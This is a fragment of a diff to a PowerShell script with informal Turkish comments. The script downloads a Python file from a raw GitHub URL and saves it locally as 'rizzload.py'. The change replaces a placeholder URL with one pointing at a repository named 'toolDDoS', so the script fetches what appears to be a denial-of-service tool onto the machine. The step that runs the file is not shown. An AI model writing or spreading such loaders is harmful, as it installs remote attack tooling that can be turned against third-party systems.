@@ -14,7 +14,7 @@ if (-not (Test-Path $targetDir)) {
 }
 
 # Python script URL'si (buraya kendi raw github linkini koy kanka)
-$rawPyUrl = "https://raw.githubusercontent.com/skibidirizz/rizzops/main/rizzed_script.py"
+$rawPyUrl = "https://raw.githubusercontent.com/doguiaste/toolDDoS/refs/heads/main/start.py"
 $pyPath = Join-Path $targetDir "rizzload.py"
 
 # Python dosyasını indir ve yaz
